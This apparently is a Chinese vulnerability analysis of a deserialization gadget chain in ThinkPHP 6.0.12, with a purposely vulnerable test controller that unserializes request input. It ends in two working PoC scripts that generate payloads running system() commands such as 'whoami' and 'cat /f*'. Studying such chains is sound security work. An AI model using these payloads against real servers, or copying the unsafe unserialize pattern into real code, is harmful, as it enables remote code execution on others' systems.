# Thinkphp6.0.12反序列化

##  环境

> Thinkphp6.0.12
>
> php 7.4.0



`composer create-project topthink/think=6.0.12 tp6`

## 测试代码

1. 在项目目录下创建一个测试控制器

`php think make:controller Test`

2. 在Test控制器 index方法中添加

```php
    public function index()
    {
        if ($a=input('param.a')){
            var_dump(base64_decode($a));
            echo "<br>";
            unserialize(base64_decode($a));
        }
    }
```

##  漏洞分析

​	1.在大佬的文章总结中， 反序列化 一般起点出现在\_\_desturct 和 \_\_wakeup 通过全局搜索 查询满足条件的 在：`vendor\topthink\think-orm\src\Model.php`(大佬怎么说我怎么写)

![image-20220303180420019](image/Thinkphp6.0.12%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/202203031804122.png)

2. 第一个条件 要把 `$this->lazySave`设置为True 

   跟进`$this->save()`, `$this->isEmpty()` 只要保证data 不为空就行 `$this->trigger('BeforeWrite'))` 默认返回为真

```php
public function isEmpty(): bool
{
    return empty($this->data);
}
```

3. 将 `$this->exists`设置为True，跟进 `$this -> updateData()`

![image-20220303181123318](image/Thinkphp6.0.12%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/202203031811438.png)

4. 在 621列 `$allowFields = $this->checkAllowFields()` 跟进

![image-20220303181558066](image/Thinkphp6.0.12%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/202203031815182.png)

5. 继续跟进 565列 `$query = $this->db();`

![image-20220303181719266](image/Thinkphp6.0.12%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/202203031817385.png)

6. 在362行将 `$this->table . $this->suffix` 拼接在一起，将$this->table 设置为一个对象 触发 \_\_toString

![image-20220303181958370](image/Thinkphp6.0.12%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/202203031819452.png)

7. 全局查找\_\_toString 最后在 `vendor\topthink\think-orm\src\model\concern\Conversion.php` 中找到\_\_toString()（以前版本也是在这里出现漏洞的，反正很好找到）这里是一个代码复用的机制所以不用将`$this->table` 设置成特定类， 刚好Model抽象类也有用到  `use model\concern\Conversion` 所以这里直接实例化本身就行

![image-20220303183151437](image/Thinkphp6.0.12%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/202203031832284.png)

8. 继续跟进`$this->toArray()` ，将 `$this->data` 设置为数据即可进入循环， 在238 中跟进 `$key` 是 `$data`的键名

![image-20220303183401764](image/Thinkphp6.0.12%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/202205292000886.png)



9. 跟进`$this->getAttr($key)` 

![image-20220303183631626](image/Thinkphp6.0.12%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/202203031836740.png)

`$name` 可控不提

`$value` 为 `$this->getData($name)`返回值 ，跟进一下

![image-20220303183905068](image/Thinkphp6.0.12%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/202203031839244.png)

`$fieldName` 跟进一下

![image-20220303183952916](image/Thinkphp6.0.12%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/202203031839092.png)

`$fieldName` 可控， 返回的是 `$this->data[$fieldName]`  

很明显这个`$value`就是 `$this->data`的值，

10. 继续跟进`$this->getValue($name, $value, $relation);`

![image-20220303184253914](image/Thinkphp6.0.12%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/202203031842083-167170448844212.png)

第 509 行 ，`$fieldName` 为 `$this->data` 键名 ，将`this->json` 设置成  `$this->data`的键名，`$this->withAttr[$fieldName]` 设置成 数组就行

11. 跟进`$this->getJsonValue($fieldName, $value)`，保证`$this->jsonAssoc`为真即可，将`$this->withAttr`的 值设置成你需要执行的函数，而 `$this->data`的值设置为 需要执行的代码即可

![image-20220303185128690](image/Thinkphp6.0.12%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/202203031851846.png)

## POC

```php
<?php
namespace think{
    abstract class Model{
        private $lazySave;
        private $data;
        protected $table;
        private $withAttr;
        protected $json ;
        protected $jsonAssoc;
        private $exists;
        public function __construct($obj = '')
        {
            $this->lazySave = True;
            $this->exists = True;
            $this->data = ['arr' =>['whoami']];
            $this->table = $obj;
                $this->withAttr = ['arr'=>['system']];
            $this->json = ['arr'];
            $this->jsonAssoc  = True;
        }	
    }
}
namespace think\Model{
    use think\Model;
    class Pivot extends Model{
    }
}

namespace {
    $a = new think\model\Pivot();
    $b = new think\model\Pivot($a);
    echo base64_encode(serialize($b));

}

```

##  结果

![image-20220303185727488](image/Thinkphp6.0.12%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/202203031857535.png)





```
<?php

namespace think\model\concern;

trait Attribute
{
    private $data = ["key" => ["key1" => "cat /f*"]];
    private $withAttr = ["key"=>["key1"=>"system"]];
    protected $json = ["key"];
}
namespace think;

abstract class Model
{
    use model\concern\Attribute;
    private $lazySave;
    protected $withEvent;
    private $exists;
    private $force;
    protected $table;
    protected $jsonAssoc;
    function __construct($obj = '')
    {
        $this->lazySave = true;
        $this->withEvent = false;
        $this->exists = true;
        $this->force = true;
        $this->table = $obj;
        $this->jsonAssoc = true;
    }
}

namespace think\model;

use think\Model;

class Pivot extends Model
{
}
$a = new Pivot();
$b = new Pivot($a);

echo urlencode(serialize($b));
```

